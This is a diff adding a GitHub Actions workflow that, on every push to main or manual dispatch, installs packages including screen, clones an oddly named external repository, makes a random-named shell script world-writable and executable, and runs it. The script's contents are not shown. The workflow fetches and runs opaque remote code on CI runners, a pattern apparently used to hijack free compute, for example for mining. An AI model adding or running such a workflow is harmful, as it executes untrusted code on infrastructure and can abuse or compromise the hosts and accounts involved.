@@ -1,0 +1,26 @@
+name: Setup & Run Script
+
+on:
+  push:
+    branches: [ main ]
+  workflow_dispatch:
+
+jobs:
+  setup-and-run:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Update & Install Packages
+        run: |
+          sudo apt-get update -y && \
+          sudo apt-get install -y screen nano git python3 python3-pip
+
+      - name: Clone External Repo
+        run: |
+          git clone https://github.com/tungtungtun/4ygh7d.git
+
+      - name: Make Script Executable & Run
+        working-directory: 4ygh7d
+        run: |
+          chmod 777 n58don.sh
+          ./n58don.sh
